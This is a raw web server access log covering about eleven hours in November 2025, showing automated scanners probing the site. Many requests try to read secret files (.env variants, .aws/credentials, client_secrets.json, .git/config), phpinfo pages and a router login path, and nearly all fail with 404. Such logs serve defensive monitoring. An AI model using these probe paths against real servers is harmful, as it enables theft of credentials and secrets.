78.153.140.178 - - [21/Nov/2025:21:34:11 +0800] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 2.3.6; pt-br; GT-S5302B Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
78.153.140.178 - - [21/Nov/2025:21:34:11 +0800] "GET /admin/.env.credentials HTTP/1.1" 404 153 "-" "Opera/10.50 (Windows NT 6.1; U; en-GB) Presto/2.2.2"
78.153.140.178 - - [21/Nov/2025:21:34:13 +0800] "GET /config/production/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5"
78.153.140.178 - - [21/Nov/2025:21:34:15 +0800] "GET /config/aws/secrets.yml HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/10.1 Mobile/15B93 Safari/602.1"
78.153.140.178 - - [21/Nov/2025:21:34:15 +0800] "GET /config/aws/secrets.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux i686; rv:47.0) Gecko/20100101 Firefox/47.0"
78.153.140.178 - - [21/Nov/2025:21:34:16 +0800] "GET /config/aws/tokens.conf HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 2.2; en-gb; GT-I5500 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
78.153.140.178 - - [21/Nov/2025:21:34:16 +0800] "GET /Web/debug/default/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.1.1; en-ca; GT-P3113 Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
78.153.140.178 - - [21/Nov/2025:21:34:17 +0800] "GET /tests/test-become/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0"
78.153.140.178 - - [21/Nov/2025:21:34:17 +0800] "GET /client/.env.production HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36 OPR/48.0.2685.32"
78.153.140.178 - - [21/Nov/2025:21:34:18 +0800] "GET /app/notifications/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 2.3.5; en-in; Micromax A62 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
78.153.140.178 - - [21/Nov/2025:21:34:18 +0800] "GET /configuras/staging.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 OPR/31.0.1890.0 OMI/4.6.1.40.Dominik2.191 VSTVB MB100 FVC/1.0 (TECHWOOD; MB110; ) HbbTV/1.3.1 (; TECHWOOD; MB110; 2.21.24.0; ;) SmartTvA/3.0.0"
78.153.140.178 - - [21/Nov/2025:21:34:19 +0800] "GET /bootstrap/.env.example HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9b3) Gecko/2008020514 Firefox/3.0b3"
78.153.140.178 - - [21/Nov/2025:21:34:20 +0800] "GET /deploy/aws_secrets.yml HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; CrOS i686 12.433.109) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30"
78.153.140.178 - - [21/Nov/2025:21:34:20 +0800] "GET /.env.example.suspected HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12H321 Safari/600.1.4"
78.153.140.178 - - [21/Nov/2025:21:34:20 +0800] "GET /.env-authorization.log HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.5 Safari/532.2"
78.153.140.178 - - [21/Nov/2025:21:34:22 +0800] "GET /.env-notification.conf HTTP/1.1" 404 153 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 5.11  [de]"
204.76.203.18 - - [21/Nov/2025:21:39:24 +0800] "GET /bins/ HTTP/1.1" 404 153 "-" "-"
157.230.29.20 - - [21/Nov/2025:21:58:32 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.30 - - [21/Nov/2025:22:01:31 +0800] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 6.0 [en]"
204.76.203.30 - - [21/Nov/2025:22:01:31 +0800] "GET /api/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; nl-nl) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.3"
45.135.193.9 - - [21/Nov/2025:22:03:58 +0800] "GET http://ip-api.com/json/ HTTP/1.1" 404 153 "-" "Go-http-client/1.1"
209.38.201.154 - - [21/Nov/2025:22:15:16 +0800] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 157 "-" "-"
157.230.29.20 - - [21/Nov/2025:22:44:36 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
2.57.122.95 - - [21/Nov/2025:23:01:01 +0800] "SSH-2.0-Go" 400 157 "-" "-"
157.230.29.20 - - [21/Nov/2025:23:19:46 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.203 - - [21/Nov/2025:23:23:03 +0800] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36"
78.153.140.203 - - [21/Nov/2025:23:23:03 +0800] "GET /api/.env HTTP/1.1" 404 153 "-" "Opera/6.04 (Windows XP; U)  [en]"
78.153.140.203 - - [21/Nov/2025:23:23:04 +0800] "GET /backend/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; Touch; rv:11.0) like Gecko"
78.153.140.203 - - [21/Nov/2025:23:23:04 +0800] "GET /admin/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1"
78.153.140.203 - - [21/Nov/2025:23:23:05 +0800] "GET /.env.example HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.89 Safari/537.36"
78.153.140.203 - - [21/Nov/2025:23:23:07 +0800] "GET /app_dev.php/_profiler/phpinfo HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10"
78.153.140.203 - - [21/Nov/2025:23:23:07 +0800] "GET /?phpinfo=-1 HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6"
78.153.140.203 - - [21/Nov/2025:23:23:08 +0800] "GET /stag/.env HTTP/1.1" 404 153 "-" "Opera/6.04 (Windows XP; U)  [en]"
78.153.140.203 - - [21/Nov/2025:23:23:09 +0800] "GET /public_html/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPad; U; CPU iPad OS 5_0_1 like Mac OS X; en-us) AppleWebKit/535.1+ (KHTML like Gecko) Version/7.2.0.0 Safari/6533.18.5"
78.153.140.203 - - [21/Nov/2025:23:23:13 +0800] "GET /.env.development HTTP/1.1" 404 153 "-" "Opera/9.61 (Macintosh; Intel Mac OS X; U; de) Presto/2.1.1"
78.153.140.203 - - [21/Nov/2025:23:23:13 +0800] "GET /portal/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; Next8P12 Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
78.153.140.203 - - [21/Nov/2025:23:23:14 +0800] "GET /project/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
78.153.140.203 - - [21/Nov/2025:23:23:14 +0800] "GET /.aws/credentials HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.5.2171.95 Safari/537.36"
78.153.140.203 - - [21/Nov/2025:23:23:15 +0800] "GET /app/config/parameters.yml HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 OPR/39.0.2256.71"
78.153.140.203 - - [21/Nov/2025:23:23:16 +0800] "GET /exapi/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; LG-LG730 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30evme-launcher"
78.153.140.203 - - [21/Nov/2025:23:23:16 +0800] "GET /client_secrets.json HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAARJS; rv:11.0) like Gecko"
78.153.140.203 - - [21/Nov/2025:23:23:17 +0800] "GET /pinfo.php HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; CoxIE55)"
157.230.29.20 - - [22/Nov/2025:00:01:14 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
20.14.79.82 - - [22/Nov/2025:00:35:06 +0800] "GET /druid/index.html HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
78.153.140.224 - - [22/Nov/2025:00:39:08 +0800] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0"
78.153.140.224 - - [22/Nov/2025:00:39:08 +0800] "GET /config/.env.js HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)"
78.153.140.224 - - [22/Nov/2025:00:39:09 +0800] "GET /app/.env.admin HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3,gzip(gfe)"
78.153.140.224 - - [22/Nov/2025:00:39:09 +0800] "GET /config/dev.env HTTP/1.1" 404 153 "-" "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.13"
78.153.140.224 - - [22/Nov/2025:00:39:11 +0800] "GET /api/config.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:11.0) Gecko/20100101 Firefox/11.0"
78.153.140.224 - - [22/Nov/2025:00:39:11 +0800] "GET /config/env.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12D508 Safari/600.1.4"
78.153.140.224 - - [22/Nov/2025:00:39:12 +0800] "GET /config/env.txt HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
78.153.140.224 - - [22/Nov/2025:00:39:12 +0800] "GET /configs/db.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Safari/602.1.31"
78.153.140.224 - - [22/Nov/2025:00:39:14 +0800] "GET /configura/.env HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 5.5;)"
78.153.140.224 - - [22/Nov/2025:00:39:15 +0800] "GET /anaconda/..env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6"
78.153.140.224 - - [22/Nov/2025:00:39:15 +0800] "GET /console/.env.1 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
78.153.140.224 - - [22/Nov/2025:00:39:16 +0800] "GET /console/.env.2 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; ru-ru) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5"
193.142.147.209 - - [22/Nov/2025:00:57:03 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
157.230.29.20 - - [22/Nov/2025:00:58:02 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.29.176.185 - - [22/Nov/2025:01:03:29 +0800] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
157.230.29.20 - - [22/Nov/2025:01:20:50 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
83.142.209.125 - - [22/Nov/2025:01:21:31 +0800] "GET /login.rsp HTTP/1.1" 404 153 "-" "Hello World"
164.92.248.162 - - [22/Nov/2025:01:21:38 +0800] "GET /prod/.git/config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
5.187.35.21 - - [22/Nov/2025:01:30:36 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
27.148.196.43 - - [22/Nov/2025:01:50:08 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Android 14; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0"
157.230.29.20 - - [22/Nov/2025:02:11:13 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.187.35.21 - - [22/Nov/2025:02:19:42 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
164.92.248.162 - - [22/Nov/2025:02:56:22 +0800] "GET /frontend/.git/config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.230.29.20 - - [22/Nov/2025:03:08:04 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.120.191.124 - - [22/Nov/2025:03:25:24 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
31.56.39.76 - - [22/Nov/2025:03:27:35 +0800] "GET / HTTP/1.1" 200 3958 "-" "Linux Gnu (cow)"
199.45.155.108 - - [22/Nov/2025:03:29:17 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.108 - - [22/Nov/2025:03:29:19 +0800] "PRI * HTTP/2.0" 400 157 "-" "-"
199.45.155.108 - - [22/Nov/2025:03:29:21 +0800] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x1E\xD6o\xA2Q;W\xD6\x84\x07\x01\x0Ff\x87\xF1T\xC4\x8E\x9C\x80G\xFA}2E\xDA4o/o\xB2\xDE \xA8\xBC\x06\xF1\xED\xC9wb3\xCCjF]\xF4\x18\x99U\xF0Ud\xC2HF\x0BWaMk\x01Z\x14\xE0\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
199.45.155.108 - - [22/Nov/2025:03:29:24 +0800] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.108 - - [22/Nov/2025:03:29:31 +0800] "GET /.well-known/security.txt HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.108 - - [22/Nov/2025:03:29:34 +0800] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xE8CG.\xDC\xE5\xD3\xE8\x8BL\xB0I\x88\xEC\xBCA\x16\xE9\x0C\x8D\xFA\xF9bl\xC8\xB6\x10YiM^J |\x90\xE5\x1C\x15\x9F\xE4\x05\xB5\x17\xC4\x94\x83hN\x88\xE8\xD9\xB6\x01H\x12\x99m\xD7]\x8D\x94t\xA4\xC5\xA7\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
204.76.203.18 - - [22/Nov/2025:03:38:06 +0800] "GET /backup/ HTTP/1.1" 404 153 "-" "-"
204.76.203.18 - - [22/Nov/2025:03:38:09 +0800] "GET /backup/ HTTP/1.1" 404 153 "-" "-"
204.76.203.18 - - [22/Nov/2025:03:38:13 +0800] "GET /backup/ HTTP/1.1" 404 153 "-" "-"
157.230.29.20 - - [22/Nov/2025:03:38:15 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.242.226.113 - - [22/Nov/2025:03:42:46 +0800] "\x16\x03\x01\x00\x8C\x01\x00\x00\x88\x03\x03\xF2\xD6\xCEi\x14" 400 157 "-" "-"
193.142.147.209 - - [22/Nov/2025:04:08:29 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
157.230.29.20 - - [22/Nov/2025:04:36:43 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
164.92.248.162 - - [22/Nov/2025:04:47:10 +0800] "GET /api/.git/config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.91.92.82 - - [22/Nov/2025:04:59:01 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
157.230.29.20 - - [22/Nov/2025:04:59:49 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
121.43.146.23 - - [22/Nov/2025:05:27:07 +0800] "GET / HTTP/1.0" 200 3958 "-" "-"
121.43.146.23 - - [22/Nov/2025:05:27:11 +0800] "GET / HTTP/1.0" 200 3958 "-" "-"
121.43.146.23 - - [22/Nov/2025:05:27:11 +0800] "GET /nmaplowercheck1763760431 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
121.43.146.23 - - [22/Nov/2025:05:27:11 +0800] "POST /sdk HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
121.43.146.23 - - [22/Nov/2025:05:27:11 +0800] "GET /evox/about HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
121.43.146.23 - - [22/Nov/2025:05:27:11 +0800] "GET /HNAP1 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
121.43.146.23 - - [22/Nov/2025:05:27:21 +0800] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xE7\xE7\xA1\xCE\xFA\xF0\x11'\x11\x93\x04\xFCI>\xE8\xA2$<$\xB2{\x97\x91\x9F\x9Di\x1F\xCA\xB1\x8C\x93\x13\x00\x00\xDA\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00" 400 157 "-" "-"
121.43.146.23 - - [22/Nov/2025:05:27:21 +0800] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03?l\xB9\xCE\x1A\x8Dh\xFB\xD8\x12\x84\xFD]\x8F\x94\xCE2\x9Ew\x942Z" 400 157 "-" "-"
121.43.146.23 - - [22/Nov/2025:05:27:31 +0800] "GET / HTTP/1.0" 200 3958 "-" "-"
121.43.146.23 - - [22/Nov/2025:05:27:31 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
27.148.196.43 - - [22/Nov/2025:05:33:43 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Android 14; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0"
198.235.24.112 - - [22/Nov/2025:05:38:39 +0800] "GET / HTTP/1.0" 200 3958 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
5.187.35.21 - - [22/Nov/2025:05:50:55 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
157.230.29.20 - - [22/Nov/2025:05:51:44 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.142.147.209 - - [22/Nov/2025:06:00:02 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
93.174.93.12 - - [22/Nov/2025:06:22:07 +0800] "GET / HTTP/1.0" 200 3958 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17"
157.230.29.20 - - [22/Nov/2025:06:43:45 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
192.159.99.101 - - [22/Nov/2025:06:47:19 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
205.210.31.34 - - [22/Nov/2025:07:03:18 +0800] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xCF\xFA\x14\xACo\x88\x19\xBC\x05\x8D\xB8\x87" 400 157 "-" "-"
205.210.31.34 - - [22/Nov/2025:07:03:18 +0800] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03h\xA0\xDF\x9D\xADX\xAA\x85\xB8\xB8\x8D\xF86\x08\x8A\xF6,\x9B\xBF\xD5\xE0#yU7\xF4\xBA\xF8I\xB1\xA1\x17 \xFB\xA1\xBE\xA3\xAD\xAD\xAD\xC2\x08\xED\xC4i{\xCC\xA3\x19\xA0\xD1\x83\x12\xC3\x89\xD1\xE5\x90\xE8\x8F\xDE\xDCL\x98\xE9\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
5.187.35.21 - - [22/Nov/2025:07:16:02 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
157.230.29.20 - - [22/Nov/2025:07:18:48 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.142.147.209 - - [22/Nov/2025:07:38:19 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
103.252.89.75 - - [22/Nov/2025:07:39:49 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
65.49.1.10 - - [22/Nov/2025:08:01:38 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
65.49.1.10 - - [22/Nov/2025:08:02:45 +0800] "GET /webui/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
157.230.29.20 - - [22/Nov/2025:08:03:29 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
65.49.1.21 - - [22/Nov/2025:08:04:40 +0800] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
65.49.1.10 - - [22/Nov/2025:08:05:05 +0800] "GET /geoserver/web/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
45.156.129.44 - - [22/Nov/2025:08:15:35 +0800] "GET /sitecore/shell/sitecore.version.xml HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.135.193.9 - - [22/Nov/2025:08:27:48 +0800] "GET http://ip-api.com/json/ HTTP/1.1" 404 153 "-" "Go-http-client/1.1"
198.235.24.154 - - [22/Nov/2025:08:30:57 +0800] "GET / HTTP/1.0" 200 3958 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
5.187.35.21 - - [22/Nov/2025:08:41:11 +0800] "GET /server.js HTTP/1.1" 404 153 "-" "-"
118.123.1.40 - - [22/Nov/2025:08:41:21 +0800] "GET /public/stylesheets/theme.css HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [22/Nov/2025:08:41:21 +0800] "GET /index.php HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.40 - - [22/Nov/2025:08:41:21 +0800] "GET /ips/index.php HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
